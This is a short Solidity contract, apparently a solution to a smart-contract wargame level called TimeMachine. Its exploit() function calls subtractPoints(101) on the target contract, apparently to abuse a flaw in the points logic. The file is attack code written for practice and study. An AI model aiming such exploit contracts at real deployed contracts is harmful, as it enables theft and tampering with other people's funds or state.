// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/TimeMachine.sol";

interface ITimeMachine {
    function subtractPoints(uint256 _amount) external;
}

contract TimeMachineAttack {
    ITimeMachine public timeMachine;

    constructor(address _timeMachineAddress) {
        timeMachine = ITimeMachine(_timeMachineAddress);
    }

    function exploit() public {
        timeMachine.subtractPoints(101);
    }
}